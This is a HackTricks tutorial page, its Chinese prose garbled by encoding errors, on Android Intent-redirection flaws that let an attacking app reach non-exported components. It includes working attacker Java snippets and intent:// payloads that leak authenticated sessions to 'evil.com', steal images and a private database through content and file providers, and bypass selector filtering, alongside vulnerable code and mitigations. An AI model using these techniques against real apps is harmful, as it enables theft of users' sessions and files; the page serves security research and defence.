<details>

<summary><strong>é›¶åŸºç¡€å­¦ä¹ AWSé»‘å®¢æ”»å‡»ç›´è‡³æˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨ **HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢ [**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š **å…³æ³¨** æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥ **åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>


**ç ”ç©¶å–è‡ª** [**https://blog.oversecured.com/Android-Access-to-app-protected-components/**](https://blog.oversecured.com/Android-Access-to-app-protected-components/)

# ä»‹ç»

è¿™ä¸ªæ¼æ´ç±»ä¼¼äº **Webå®‰å…¨ä¸­çš„å¼€æ”¾é‡å®šå‘**ã€‚ç”±äº`Intent`ç±»æ˜¯`Parcelable`ï¼Œ**å±äºè¿™ä¸ªç±»çš„å¯¹è±¡**å¯ä»¥ä½œä¸º**é¢å¤–çš„** **æ•°æ®**ä¼ é€’ç»™å¦ä¸€ä¸ª`Intent`å¯¹è±¡ã€‚\
è®¸å¤šå¼€å‘è€…åˆ©ç”¨è¿™ä¸ª**ç‰¹æ€§**åˆ›å»º**ä»£ç†** **ç»„ä»¶**ï¼ˆæ´»åŠ¨ã€å¹¿æ’­æ¥æ”¶å™¨å’ŒæœåŠ¡ï¼‰ï¼Œå®ƒä»¬**æ¥æ”¶ä¸€ä¸ªåµŒå…¥çš„Intentå¹¶å°†å…¶ä¼ é€’ç»™å±é™©æ–¹æ³•**ï¼Œå¦‚`startActivity(...)`ã€`sendBroadcast(...)`ç­‰ã€‚\
è¿™æ˜¯å±é™©çš„ï¼Œå› ä¸º**æ”»å‡»è€…å¯ä»¥å¼ºè¿«åº”ç”¨å¯åŠ¨ä¸€ä¸ªéå¯¼å‡ºç»„ä»¶ï¼Œè¯¥ç»„ä»¶ä¸èƒ½ç›´æ¥ä»å¦ä¸€ä¸ªåº”ç”¨å¯åŠ¨**ï¼Œæˆ–è€…æˆäºˆæ”»å‡»è€…è®¿é—®å…¶å†…å®¹æä¾›è€…çš„æƒé™ã€‚**`WebView`** æœ‰æ—¶ä¹Ÿä¼šå°†**URLä»å­—ç¬¦ä¸²æ›´æ”¹ä¸º`Intent`**å¯¹è±¡ï¼Œä½¿ç”¨`Intent.parseUri(...)`æ–¹æ³•ï¼Œå¹¶å°†å…¶ä¼ é€’ç»™`startActivity(...)`ã€‚

{% hint style="info" %}
æ€»ç»“ï¼šå¦‚æœæ”»å‡»è€…å¯ä»¥å‘é€ä¸€ä¸ªä¸å®‰å…¨æ‰§è¡Œçš„Intentï¼Œä»–å¯èƒ½ä¼šè®¿é—®æœªå¯¼å‡ºçš„ç»„ä»¶å¹¶æ»¥ç”¨å®ƒä»¬ã€‚
{% endhint %}

# å…¸å‹æ¡ˆä¾‹

è®©æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªä¾‹å­ã€‚`AndroidManifest.xml`æ–‡ä»¶çš„ç‰‡æ®µ
```markup
<activity android:name=".ProxyActivity" android:exported="true" />
<activity android:name=".AuthWebViewActivity" android:exported="false" />
```
Activity `ProxyActivity`
```java
startActivity((Intent) getIntent().getParcelableExtra("extra_intent"));
```
Activity `AuthWebViewActivity`
```java
webView.loadUrl(getIntent().getStringExtra("url"), getAuthHeaders());
```
`AuthWebViewActivity` æ˜¯ä¸€ä¸ªä¾‹å­ï¼Œå±•ç¤ºäº†**éšè—çš„åº”ç”¨åŠŸèƒ½æ‰§è¡ŒæŸäº›ä¸å®‰å…¨çš„æ“ä½œ**ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå°†ç”¨æˆ·çš„è®¤è¯ä¼šè¯ä¼ é€’ç»™ä» `url` å‚æ•°è·å¾—çš„ URLã€‚

å‡ºå£é™åˆ¶æ„å‘³ç€**æ”»å‡»è€…æ— æ³•ç›´æ¥è®¿é—® `AuthWebViewActivity`**ã€‚ä¸€ä¸ªç›´æ¥è°ƒç”¨
```java
Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.AuthWebViewActivity");
intent.putExtra("url", "http://evil.com/");
startActivity(intent);
```
æŠ›å‡ºä¸€ä¸ª`java.lang.SecurityException`ï¼Œå› ä¸º`Permission Denial`ï¼š`AuthWebViewActivity`æ²¡æœ‰ä»uid 1337å¯¼å‡ºã€‚

ä½†æ˜¯æ”»å‡»è€…å¯ä»¥**å¼ºè¿«å—å®³è€…å¯åŠ¨`AuthWebViewActivity`æœ¬èº«**ï¼š
```java
Intent extra = new Intent();
extra.setClassName("com.victim", "com.victim.AuthWebViewActivity");
extra.putExtra("url", "http://evil.com/");

Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.ProxyActivity");
intent.putExtra("extra_intent", extra);
startActivity(intent);
```
# æƒé™æå‡çš„å½±å“

ä¸ºäº†æå‡è¿™ä¸ªæ¼æ´çš„å½±å“ï¼Œä½ éœ€è¦**æ‰¾åˆ°å…¶ä»–æ¼æ´/é…ç½®é”™è¯¯ï¼Œè¿™äº›æ¼æ´/é…ç½®é”™è¯¯å¯ä»¥å¢åŠ æ¼æ´çš„å½±å“**ï¼ˆå› ä¸ºå•ç‹¬çš„æ¼æ´å¹¶æ²¡æœ‰äº§ç”Ÿä»»ä½•é£é™©ï¼‰ã€‚

## é€šè¿‡å†…å®¹æä¾›è€…æå‡æ”»å‡»

é™¤äº†è®¿é—®åŸå§‹åº”ç”¨ç¨‹åºçš„ä»»æ„ç»„ä»¶å¤–ï¼Œ**æ”»å‡»è€…å¯ä»¥å°è¯•è®¿é—®é‚£äº›æ»¡è¶³ä»¥ä¸‹æ¡ä»¶çš„å—å½±å“åº”ç”¨ç¨‹åºçš„å†…å®¹æä¾›è€…**ï¼š

* å®ƒå¿…é¡»æ˜¯**éå¯¼å‡ºçš„**ï¼ˆå¦åˆ™å¯ä»¥**ç›´æ¥æ”»å‡»**ï¼Œæ— éœ€ä½¿ç”¨æˆ‘ä»¬åœ¨æœ¬æ–‡ä¸­è®¨è®ºçš„æ¼æ´ï¼‰
* å®ƒå¿…é¡»è®¾ç½®äº†**`android:grantUriPermissions`** æ ‡å¿—ä¸º **`true`**ã€‚
* `android:grantUriPermissions="true"` è¡¨ç¤ºä½ çš„ Java ä»£ç å¯ä»¥å¯¹è¯¥ `ContentProvider` æä¾›çš„**ä»»ä½• `Uri`** ä½¿ç”¨ `FLAG_GRANT_READ_URI_PERMISSION` å’Œ `FLAG_GRANT_WRITE_URI_PERMISSION`ã€‚
* `android:grantUriPermissions="false"` è¡¨ç¤º**åªæœ‰ `<grant-uri-permission>` å­å…ƒç´ æŒ‡å®šçš„ `Uri` å€¼**å¯ä»¥ä½¿ç”¨ `FLAG_GRANT_READ_URI_PERMISSION` å’Œ `FLAG_GRANT_WRITE_URI_PERMISSION`ã€‚

æ”»å‡»è€…å¿…é¡»å°†è‡ªå·±è®¾ç½®ä¸ºåµŒå…¥æ„å›¾çš„æ¥æ”¶è€…ï¼Œå¹¶è®¾ç½®ä»¥ä¸‹æ ‡å¿—

* `Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION` å…è®¸æŒä¹…è®¿é—®æä¾›è€…ï¼ˆæ²¡æœ‰è¿™ä¸ªæ ‡å¿—ï¼Œè®¿é—®åªæ˜¯ä¸€æ¬¡æ€§çš„ï¼‰
* `Intent.FLAG_GRANT_PREFIX_URI_PERMISSION` å…è®¸é€šè¿‡å‰ç¼€è®¿é—® URI - ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨ URI `content://com.victim.provider/` æˆäºˆå¯¹æä¾›è€…æ‰€æœ‰å†…å®¹çš„è®¿é—®æƒé™ï¼Œè€Œä¸æ˜¯åå¤ä½¿ç”¨å®Œæ•´è·¯å¾„å¦‚ `content://com.victim.provider/image/1` å•ç‹¬è·å–è®¿é—®æƒé™ï¼Œç„¶åä½¿ç”¨ `ContentResolver` æ¥è®¿é—® `content://com.victim.provider/image/1`ï¼Œ`content://com.victim.provider/image/2` ç­‰ã€‚
* `Intent.FLAG_GRANT_READ_URI_PERMISSION` å…è®¸å¯¹æä¾›è€…è¿›è¡Œè¯»æ“ä½œï¼ˆå¦‚ `query`ï¼Œ`openFile`ï¼Œ`openAssetFile`ï¼‰
* `Intent.FLAG_GRANT_WRITE_URI_PERMISSION` å…è®¸å†™æ“ä½œ

ä¸€ä¸ªå…¸å‹çš„æä¾›è€…ç¤ºä¾‹ï¼Œæ”»å‡»è€…å¯ä»¥è·å¾—å¯¹å…¶çš„è®¿é—®æƒé™ï¼Œå¹¶æ‰§è¡Œå¸¸è§„æ“ä½œï¼Œå¦‚ `query`ï¼Œ`update`ï¼Œ`insert`ï¼Œ`delete`ï¼Œ`openFile`ï¼Œ`openAssetFile`
```markup
<provider android:name="com.victim.ContentProvider" android:exported="false" android:authorities="com.victim.provider" android:grantUriPermissions="true"/>
```
ç¤ºä¾‹ï¼šç›—å–ç”¨æˆ·å›¾ç‰‡çš„ `AndroidManifest.xml` æ–‡ä»¶
```markup
<activity android:name=".LeakActivity" android:exported="true" />
```
`MainActivity.java` æ–‡ä»¶
```java
Intent extra = new Intent();
extra.setFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
| Intent.FLAG_GRANT_PREFIX_URI_PERMISSION
| Intent.FLAG_GRANT_READ_URI_PERMISSION
| Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
extra.setClassName(getPackageName(), "com.attacker.LeakActivity");
extra.setData(Uri.parse("content://com.victim.provider/"));

Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.ProxyActivity");
intent.putExtra("extra_intent", extra);
startActivity(intent);
```
`LeakActivity.java`
```java
Uri uri = Uri.parse(getIntent().getDataString() + "image/1")); // content://com.victim.provider/image/1
Bitmap bitmap = BitmapFactory.decodeStream(getContentResolver().openInputStream(uri)); // stolen image
```
## æ”»å‡» Android æ–‡ä»¶æä¾›è€…

è¿™ä¸ªæ¼æ´ä¹Ÿä½¿å¾—æ”»å‡»è€…èƒ½å¤Ÿ**çªƒå–ä½äºå¼€å‘è€…é¢„å®šç›®å½•ä¸­çš„åº”ç”¨æ–‡ä»¶**ã€‚ä¸ºäº†æˆåŠŸæ”»å‡»ï¼Œæ¶æ„åº”ç”¨éœ€è¦**è·å–å¯¹ Android æ–‡ä»¶æä¾›è€…çš„è®¿é—®æƒé™ï¼Œç„¶åä½¿ç”¨ Android ContentResolver è¯»å–æ–‡ä»¶æä¾›è€…çš„å†…å®¹**ã€‚

ç¤ºä¾‹æ–‡ä»¶æä¾›è€…ï¼ˆæ›´å¤šè¯¦æƒ…è§ [https://developer.android.com/reference/android/support/v4/content/FileProvider](https://developer.android.com/reference/android/support/v4/content/FileProvider)ï¼‰
```markup
<provider android:name="androidx.core.content.FileProvider" android:exported="false" android:authorities="com.victim.files_provider" android:grantUriPermissions="true">
<meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/provider_paths"/>
</provider>
```
å®ƒæä¾›å¯¹ç‰¹å®šåˆ—è¡¨ä¸­æ–‡ä»¶çš„è¯»/å†™è®¿é—®æƒé™ï¼Œè¯¥åˆ—è¡¨å¯ä»¥åœ¨åº”ç”¨èµ„æºä¸­æ‰¾åˆ°ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ä½äº `res/xml/provider_paths.xml`

å®ƒå¯èƒ½çœ‹èµ·æ¥æœ‰ç‚¹åƒ
```markup
<?xml version="1.0" encoding="utf-8"?>
<paths>
<root-path name="root" path=""/>
<files-path name="internal_files" path="."/>
<cache-path name="cache" path=""/>
<external-path name="external_files" path="images"/>
</paths>
```
```markdown
æ¯ä¸ªæ ‡ç­¾æŒ‡å®šä¸€ä¸ªç›¸å¯¹äºæ ¹ç›®å½•çš„ `path` å€¼ã€‚ä¾‹å¦‚ï¼Œå€¼ `external_files` å°†å¯¹åº”äº `new File(Environment.getExternalStorageDirectory(), "images")`

å€¼ `root-path` å¯¹åº”äº `/`ï¼Œå³æä¾›å¯¹ä»»æ„æ–‡ä»¶çš„è®¿é—®ã€‚

å‡è®¾æˆ‘ä»¬åœ¨æ–‡ä»¶ `/data/data/com.victim/databases/secret.db` ä¸­å­˜å‚¨äº†ä¸€äº›ç§˜å¯†æ•°æ®ï¼šçªƒå–è¿™ä¸ªæ–‡ä»¶çš„è¡Œä¸ºå¯èƒ½çœ‹èµ·æ¥åƒè¿™æ · `MainActivity.java`
```
```java
Intent extra = new Intent();
extra.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
extra.setClassName(getPackageName(), "com.attacker.LeakActivity");
extra.setData(Uri.parse("content://com.victim.files_provider/root/data/data/com.victim/databases/secret.db"));

Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.ProxyActivity");
intent.putExtra("extra_intent", extra);
startActivity(intent);
```
`LeakActivity.java`
```java
InputStream i = getContentResolver().openInputStream(getIntent().getData()); // we can now do whatever we like with this stream, e.g. send it to a remote server
```
## é€šè¿‡ WebView è®¿é—®ä»»æ„ç»„ä»¶

Intent å¯¹è±¡å¯ä»¥é€šè¿‡è°ƒç”¨ `Intent.toUri(flags)` è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œå¹¶ä¸”å¯ä»¥ä½¿ç”¨ `Intent.parseUri(stringUri, flags)` ä»å­—ç¬¦ä¸²è½¬æ¢å› Intentã€‚è¿™ä¸ªåŠŸèƒ½ç»å¸¸ç”¨åœ¨ WebViewï¼ˆåº”ç”¨å†…ç½®çš„æµè§ˆå™¨ï¼‰ä¸­ï¼š**åº”ç”¨å¯ä»¥éªŒè¯ `intent://` æ–¹æ¡ˆï¼Œè§£æ URL æˆä¸€ä¸ª Intent å¹¶å¯åŠ¨æ´»åŠ¨**ã€‚

**è¿™ä¸ªæ¼æ´å¯ä»¥é€šè¿‡å…¶ä»–æ¼æ´åˆ©ç”¨**ï¼ˆä¾‹å¦‚ï¼Œèƒ½å¤Ÿåœ¨åº”ç”¨å†…çš„ WebView ä¸­ç›´æ¥é€šè¿‡å¯¼å‡ºçš„æ´»åŠ¨æ‰“å¼€ä»»æ„é“¾æ¥ï¼Œæˆ–è€…é€šè¿‡æ·±åº¦é“¾æ¥æœºåˆ¶ï¼‰åœ¨å®¢æˆ·ç«¯åº”ç”¨ä¸­ï¼Œä¹Ÿå¯ä»¥è¿œç¨‹åˆ©ç”¨ï¼ŒåŒ…æ‹¬æœåŠ¡å™¨ç«¯çš„è·¨ç«™è„šæœ¬æ”»å‡»æˆ–å®¢æˆ·ç«¯çš„ä¸­é—´äººæ”»å‡»ã€‚

ç¤ºä¾‹ä»£ç å­˜åœ¨æ¼æ´
```java
public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
Uri uri = request.getUrl();
if("intent".equals(uri.getScheme())) {
startActivity(Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME));
return true;
}
return super.shouldOverrideUrlLoading(view, request);
}
```
```markdown
è¿™é‡Œçš„å…³é”®æ˜¯ï¼Œæ¯æ¬¡WebViewå°è¯•åŠ è½½æ–°é“¾æ¥æ—¶ï¼Œéƒ½ä¼šè°ƒç”¨`WebViewClient`ç±»çš„`shouldOverrideUrlLoading(...)`æ–¹æ³•ï¼Œä½†è¿™ç»™äº†åº”ç”¨ç¨‹åºæ·»åŠ è‡ªå®šä¹‰å¤„ç†ç¨‹åºçš„é€‰é¡¹ã€‚

ä¸ºäº†åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œæ”»å‡»è€…éœ€è¦åˆ›å»ºä¸€ä¸ªWebViewé‡å®šå‘åˆ°ä¸€ä¸ªç‰¹åˆ«å‡†å¤‡çš„intent-scheme URLã€‚åˆ›å»ºURLçš„ä¾‹å­
```
```java
Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.AuthWebViewActivity");
intent.putExtra("url", "http://evil.com/");
Log.d("evil", intent.toUri(Intent.URI_INTENT_SCHEME)); // outputs "intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end"
```
ç¤ºä¾‹æ”»å‡»
```java
location.href = "intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end";
```
æ­¤ç‰ˆæœ¬ä¸ç»å…¸ç‰ˆæœ¬çš„æ¼æ´ç›¸æ¯”æœ‰**è‹¥å¹²é™åˆ¶**ï¼š

* åµŒå…¥çš„ `Parcelable` å’Œ `Serializable` å¯¹è±¡ä¸èƒ½è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼ˆå®ƒä»¬å°†è¢«å¿½ç•¥ï¼‰
* å½“è°ƒç”¨ `Intent.parseUri(...)` æ—¶ï¼Œä¸å®‰å…¨çš„æ ‡å¿— `Intent.FLAG_GRANT_READ_URI_PERMISSION` å’Œ `Intent.FLAG_GRANT_WRITE_URI_PERMISSION` å°†è¢«**å¿½ç•¥**ã€‚è§£æå™¨åªæœ‰åœ¨è®¾ç½®äº† `Intent.URI_ALLOW_UNSAFE`ï¼ˆ`startActivity(Intent.parseUri(url, Intent.URI_INTENT_SCHEME | Intent.URI_ALLOW_UNSAFE))`ï¼‰æ ‡å¿—æ—¶æ‰ä¼šä¿ç•™å®ƒä»¬ï¼Œè¿™ç§æƒ…å†µéå¸¸ç½•è§

è®¸å¤šå¼€å‘è€…ä»ç„¶å¿˜è®°å¯¹é€šè¿‡ WebView æ”¶åˆ°çš„ intents è¿›è¡Œå®Œæ•´è¿‡æ»¤ã€‚
```java
public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
Uri uri = request.getUrl();
if("intent".equals(uri.getScheme())) {
Intent intent = Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME);
intent.addCategory("android.intent.category.BROWSABLE");
intent.setComponent(null);
startActivity(intent);
return true;
}
return super.shouldOverrideUrlLoading(view, request);
}
```
æ”»å‡»è€…å¯ä»¥é€šè¿‡é€‰æ‹©å™¨æŒ‡å®šä¸€ä¸ªéå¯¼å‡ºç»„ä»¶
```java
Intent intent = new Intent();
intent.setSelector(new Intent().setClassName("com.victim", "com.victim.AuthWebViewActivity"));
intent.putExtra("url", "http://evil.com/");
Log.d("evil", intent.toUri(Intent.URI_INTENT_SCHEME)); // "intent:#Intent;S.url=http%3A%2F%2Fevil.com%2F;SEL;component=com.victim/.AuthWebViewActivity;end"
```
å¹¶ç»•è¿‡åº”ç”¨ç¨‹åºå¯¹æ˜¾å¼æ„å›¾çš„ä¿æŠ¤ã€‚å› æ­¤ï¼Œæˆ‘ä»¬è¿˜å»ºè®®è¿‡æ»¤é€‰æ‹©å™¨ã€‚
```java
intent.addCategory("android.intent.category.BROWSABLE");
intent.setComponent(null);
intent.setSelector(null);
```
```markdown
ä½†å³ä½¿è¿›è¡Œäº†å®Œæ•´çš„è¿‡æ»¤ï¼Œä¹Ÿä¸èƒ½ä¿è¯å®Œå…¨çš„ä¿æŠ¤ï¼Œå› ä¸ºæ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ªä¸æŸä¸ªéå¯¼å‡ºæ´»åŠ¨çš„ `intent-filter` ç›¸å¯¹åº”çš„éšå¼æ„å›¾ã€‚æ´»åŠ¨å£°æ˜çš„ç¤ºä¾‹ï¼š
```
```markup
<activity android:name=".AuthWebViewActivity" android:exported="false">
<intent-filter>
<action android:name="android.intent.action.VIEW" />
<category android:name="android.intent.category.DEFAULT" />
<data android:scheme="victim" android:host="secure_handler" />
</intent-filter>
</activity>
```

```java
webView.loadUrl(getIntent().getData().getQueryParameter("url"), getAuthHeaders());
```
æˆ‘ä»¬å› æ­¤å»ºè®®åœ¨å¯åŠ¨æ´»åŠ¨ä¹‹å‰æ£€æŸ¥å®ƒæ˜¯å¦å·²å¯¼å‡ºã€‚

## åˆ›å»ºä¸å®‰å…¨æ„å›¾çš„å…¶ä»–æ–¹æ³•

ä¸€äº›åº”ç”¨å¼€å‘è€…å®ç°äº†ä»–ä»¬**è‡ªå·±çš„æ„å›¾è§£æå™¨**ï¼ˆé€šå¸¸ç”¨äºå¤„ç†**æ·±é“¾æ¥**æˆ–æ¨é€æ¶ˆæ¯ï¼‰ï¼Œä½¿ç”¨ä¾‹å¦‚**JSON**å¯¹è±¡ã€å­—ç¬¦ä¸²æˆ–å­—èŠ‚æ•°ç»„ï¼Œè¿™äº›è¦ä¹ˆä¸é»˜è®¤è®¾ç½®æ— å¼‚ï¼Œè¦ä¹ˆå­˜åœ¨å¾ˆå¤§çš„å±é™©ï¼Œå› ä¸ºå®ƒä»¬å¯èƒ½æ‰©å±•**`Serializable`** å’Œ `Parcelable` å¯¹è±¡ï¼Œå¹¶ä¸”å®ƒä»¬ä¹Ÿå…è®¸è®¾ç½®ä¸å®‰å…¨çš„æ ‡å¿—ã€‚å®‰å…¨ç ”ç©¶å‘˜ä¹Ÿå¯èƒ½é‡åˆ°æ›´å¤šå¥‡ç‰¹çš„æ„å›¾åˆ›å»ºæ–¹å¼ï¼Œä¾‹å¦‚å°†å­—èŠ‚æ•°ç»„è½¬æ¢ä¸º `Parcel`ï¼Œç„¶åä»ä¸­è¯»å–ä¸€ä¸ªæ„å›¾ã€‚
```java
Uri deeplinkUri = getIntent().getData();
if(deeplinkUri.toString().startsWith("deeplink://handle/")) {
byte[] handle = Base64.decode(deeplinkUri.getQueryParameter("param"), 0);
Parcel parcel = Parcel.obtain();
parcel.unmarshall(handle, 0, handle.length);
startActivity((Intent) parcel.readParcelable(getClassLoader()));
}
```
# æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åº

{% embed url="https://github.com/oversecured/ovaa" %}


<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ç›´åˆ°æˆä¸ºä¸“å®¶ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹çš„PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
